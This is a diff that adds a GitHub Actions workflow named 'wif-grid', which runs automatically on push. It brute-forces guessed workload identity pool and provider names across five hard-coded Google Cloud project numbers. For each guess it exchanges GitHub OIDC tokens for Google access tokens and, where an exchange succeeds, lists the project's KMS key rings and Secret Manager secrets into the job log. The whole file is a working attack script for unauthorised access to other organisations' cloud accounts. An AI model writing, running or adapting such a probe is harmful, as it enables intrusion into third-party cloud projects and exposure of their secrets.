@@ -1,0 +1,41 @@
+name: wif-grid
+on:
+  push:
+    paths:
+      - ".github/workflows/wif-grid.yml"
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  wif:
+    runs-on: ubuntu-latest
+    steps:
+      - name: grid
+        run: |
+          set -u
+          for NUM in 969676484546 350330337821 256538497032 892124123196 520807166293; do
+            for POOL in github github-actions github-oidc gh synkube sync; do
+              for PROV in github github-actions oidc; do
+                AUD="//iam.googleapis.com/projects/$NUM/locations/global/workloadIdentityPools/$POOL/providers/$PROV"
+                TOK=$(curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD")" | jq -r '.value // empty')
+                if [ -z "$TOK" ]; then echo "MINT_FAIL $NUM $POOL $PROV"; continue; fi
+                R=$(curl -sS --max-time 20 -X POST https://sts.googleapis.com/v1/token \
+                  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+                  --data-urlencode "audience=$AUD" \
+                  -d "scope=https://www.googleapis.com/auth/cloud-platform" \
+                  -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+                  -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+                  --data-urlencode "subject_token=$TOK")
+                CODE=$(printf '%s' "$R" | jq -r '.access_token // empty' 2>/dev/null)
+                if [ -n "$CODE" ]; then
+                  echo "WIF_OK $NUM pool=$POOL provider=$PROV len=${#CODE}"
+                  curl -sS --max-time 20 -H "Authorization: Bearer $CODE" "https://cloudkms.googleapis.com/v1/projects/$NUM/locations/-/keyRings?pageSize=100" | head -c 900; echo
+                  curl -sS --max-time 20 -H "Authorization: Bearer $CODE" "https://secretmanager.googleapis.com/v1/projects/$NUM/secrets?pageSize=100" | head -c 700; echo
+                else
+                  echo "WIF_NO $NUM pool=$POOL provider=$PROV :: $(printf '%s' "$R" | head -c 260)"
+                fi
+              done
+            done
+          done
+          echo "=== done ==="
